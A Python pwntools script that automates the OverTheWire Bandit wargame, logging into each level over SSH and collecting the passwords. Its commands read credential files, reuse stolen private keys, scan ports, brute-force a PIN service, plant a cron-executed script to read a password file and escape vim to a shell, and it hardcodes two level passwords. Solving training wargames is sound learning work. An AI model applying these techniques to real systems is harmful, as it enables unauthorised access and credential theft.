#! /usr/bin/env python3
import pwn
import time
import os

def display():
    global flag, user
    print ("\n")
    print ("########################################################")
    print (" \t\t USER = "+user.decode("utf-8"))
    print (" \t\t FLAG = "+flag.decode("utf-8"))
    print ("########################################################")
    print ("\n")


def add_flag():
    global flag, i, user
    i+=1
    user=b"bandit"+bytes(str(i),"ascii")
    if user not in [b'bandit15', b'bandit16', b'bandit25']:
        flag=flag[2:]
    f.write(user+b":\t"+flag)
    flag=flag[:-1]
    display()

def connexion():
    global flag, host, user, port 
    return pwn.ssh(user, host, password=flag, port=port)

def start():
    global s, sh
    s=connexion()
    sh=s.run('sh')

def end():
    global s, sh, flag, user
    if user != b'bandit6':
        flag = sh.recvline()
    add_flag()
    s.close()

# set variables
f=open("flag.txt","wb")
i=-1
host='bandit.labs.overthewire.org'
user=b"bandit"+bytes(str(i),"ascii")
port=2220

# bandit0
flag=b"$ bandit0\n"
add_flag()

# bandit0 --> bandit1
start()
sh.sendline(b'cat *')  #sh.sendline(b'cat readme')
end()

# bandit1 --> bandit2
start()
sh.sendline(b'cat ./-')
end()

# bandit2 --> bandit3
start()
sh.sendline(b'cat *')  #sh.sendline(b'cat spaces\ in\ this\ filename')
end()

# bandit3 --> bandit4
start()
sh.sendline(b'cat inhere/.hidden')
end()

# bandit4 --> bandit5
start()
sh.sendline(b'cat $(find inhere/ -type f | xargs file | grep text | cut -d":" -f1)')
#sh.sendline(b'cat inhere/./-file07')
end()


# bandit5 --> bandit6
start()
sh.sendline(b'cat $(find . -size 1033c)') #sh.sendline(b'cat inhere/maybehere07/.file2')
end()

# bandit6 --> bandit7
start()
sh.sendline(b'export name=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
sh.sendline(b'find / -user bandit7 -group bandit6 -size 33c > /tmp/$name')
sh.sendline(b'cat $(cat /tmp/$name)')
#sh.sendline(b'cat /var/lib/dpkg/info/bandit7.password')
flag=sh.recvline()
while b"Permission denied" in flag or b"No such file or directory" in flag:
    flag=sh.recvline()
end()

# bandit7 --> bandit8
start()
sh = s.run('sh')
sh.sendline(b'cat data.txt | grep "millionth" | cut -c11-')
end()

# bandit8 --> bandit9
start()
sh.sendline(b'cat data.txt | sort | uniq -u')
end()

# bandit9 --> bandit10
start()
sh.sendline(b'cat data.txt | strings | grep "===" | tail -n 1 | cut -d" " -f2')
end()

# bandit10 --> bandit11
start()
sh.sendline(b'base64 -d data.txt | cut -d" " -f4')
end()

# bandit11 --> bandit12
start()
sh.sendline(b'cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m" | cut -d" " -f4')
end()

# bandit12 --> bandit13
start()
sh.sendline(b'export name=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
sh.sendline(b'mkdir /tmp/$name')
sh.sendline(b'xxd -r data.txt > /tmp/$name/data.gz')
sh.sendline(b'cd /tmp/$name')
sh.sendline(b'gzip -d data.gz')
sh.sendline(b'mv data data.bz2')
sh.sendline(b'bzip2 -d data.bz2')
sh.sendline(b'mv data data.gz')
sh.sendline(b'gzip -d data.gz')
sh.sendline(b'mv data data.tar')
sh.sendline(b'tar xvf data.tar')
sh.sendline(b'mv data5.bin data.tar')
sh.sendline(b'tar xvf data.tar')
sh.sendline(b'mv data6.bin data.bz2')
sh.sendline(b'bzip2 -d data.bz2')
sh.sendline(b'mv data data.tar')
sh.sendline(b'tar xvf data.tar')
sh.sendline(b'mv data8.bin data.gz')
sh.sendline(b'gzip -d data.gz')
sh.sendline(b'cat data | cut -d" " -f4')
sh.recvuntil('data8.bin\n')
sh.recvuntil('$ $ ')
end()

# bandit13 --> bandit14
start()
sh.sendline(b'cat sshkey.private')
f2=open('sshkey','wb')
sh.recvuntil(b"$ ")
f2.write(sh.recvuntil(b"-----END RSA PRIVATE KEY-----\n"))
f2.close()
s.close()
s=pwn.ssh('bandit14', host, keyfile='./sshkey', port=port)
sh=s.run('sh')
sh.sendline(b'cat /etc/bandit_pass/bandit14')
end()
os.system('rm sshkey')

# bandit14 --> bandit15
start()
sh.sendline(b'echo '+flag+b' | nc localhost 30000')
sh.recvline()
end()

# bandit15 --> bandit16
start()
sh.sendline(b'openssl s_client -quiet -connect 127.0.0.1:30001')
sh.recvuntil(b'\nverify return:1\n')
sh.sendline(flag)
sh.recvline()
sh.recvline()
sh.recvline()
end()

# bandit16 --> bandit17
start()
sh.sendline(b'nmap localhost -p31000-32000')
sh.recvuntil('PORT      STATE SERVICE\n')
data=sh.recvuntil('\nNmap done')
L=data.split(b"\n")[:-2]
M=[x[:5] for x in L]
s.close()

def exploit_bandit16(M):
    for elem in M:
        start()
        sh.sendline(b'openssl s_client -quiet -connect localhost:'+elem)
        if b"unknown" not in sh.recvline():
            sh.recvuntil(b'\nverify return:1\n')
            sh.recvline()
            sh.recvline()
            sh.sendline(flag)
            if flag not in sh.recvline():
                f3=open("sshkey","wb")
                f3.write(sh.recvuntil("-----END RSA PRIVATE KEY-----\n"))
                f3.close()
                return
            s.close()
    return

exploit_bandit16(M)
s.close()
s=pwn.ssh('bandit17', host, keyfile='./sshkey', port=port)
sh=s.run('sh')
sh.sendline(b'cat /etc/bandit_pass/bandit17')
end()
os.system('rm sshkey')

# bandit17 --> bandit18
start()
sh.sendline(b'diff * | head -n 2 | tail -n 1 | cut -d" " -f2')
end()

# bandit18 --> bandit19
start()
sh.sendline(b'cat readme')
end()

# bandit19 --> bandit20
start()
sh.sendline(b'./bandit20-do cat /etc/bandit_pass/bandit20')
end()

# bandit20 --> bandit21
start()
sh.sendline(b'echo '+flag+b' | nc -l -p 6000')
s2=pwn.ssh(user, host, password=flag, port=port)
sh2=s2.run('sh')
sh2.sendline(b'./suconnect 6000')
s2.close()
end()

# bandit21 --> bandit22
start()
sh.sendline(b'cat $(cat /usr/bin/cronjob_bandit22.sh | cut -d" " -f3 | head -n 2 | tail -n 1)')
end()

# bandit22 --> bandit23
start()
sh.sendline(b'cat /tmp/$(echo "I am user bandit23" | md5sum | cut -d" " -f1)')
end()

# bandit23 --> bandit24
start()
sh.sendline(b'export folder=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
sh.sendline(b'export name=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
sh.sendline(b'export name2=$(cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 15 | head -n 1)')
sh.sendline(b'mkdir /tmp/$folder')
sh.sendline(b'echo "#! /bin/sh" >> /tmp/$folder/$name')
sh.sendline(b'echo "cat /etc/bandit_pass/bandit24 >> /tmp/""$folder""/""$name2" >> /tmp/$folder/$name')
sh.sendline(b'chmod -R 777 /tmp/$folder')
sh.sendline('cp /tmp/$folder/$name /var/spool/bandit24/')
print("Waiting 60sec for crontab ...")
timecount=60
while timecount>0:
    print(timecount, end='')
    time.sleep(0.33)
    print('.', end='')
    time.sleep(0.33)
    print('.', end='')
    time.sleep(0.33)
    timecount-=1
print(timecount)
sh.sendline('cat /tmp/$folder/$name2')
sh.recvuntil('$ $ $ $ $ $ $ $ ')
end()

# bandit24 --> bandit25
start()

def exploit_bandit24(sh):
    sh.sendline(b'nc localhost 30002')
    print(sh.recvline())
    for i in range(10000):
        pincode='{0:04}'.format(i).encode()
        sh.sendline(flag+b' '+pincode)
        print(b'Try: '+pincode)
        output=sh.recvline()
        if b'Timeout' in output:
            sh.sendline(b'nc localhost 30002')
            print(sh.recvline())
        elif output!=b'Wrong! Please enter the correct pincode. Try again.\n':
            print(output)
            sh.recvuntil(b'The password of user bandit25 is ')
            return

exploit_bandit24(sh)
end()

# bandit25 --> bandit26
start()
sh.sendline("cat bandit26.sshkey")
f4=open("sshkey","wb")
f4.write(sh.recvline()[2:])
f4.write(sh.recvuntil("-----END RSA PRIVATE KEY-----\n"))
f4.close()
s.close()

print("Réduire la fenêtre au maximum")
print("ssh -i sshkey bandit26@bandit.labs.overthewire.org -p 2220")
print("Appuyer sur 'v' puis ':e cat /etc/bandit_pass/bandit26'")
flag=b'$ 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n'
add_flag()
os.system('rm sshkey')

print("Réduire la fenêtre au maximum")
print("Appuyer sur 'v' puis ':set shell=/bin/bash' et ':shell' pour escape vim (http://zteeed.fr:4000)")
print("env command --> env /bin/sh --> id euid=bandit27")
flag=b'$ 3ba3118a22e93127a4ed485be72ef5ea'
add_flag()

# end
f.close()
print ("\n")
print ("\t\t OverTheWire Bandit Passwords")
print ("\n")
os.system('cat flag.txt')
print ("\n")
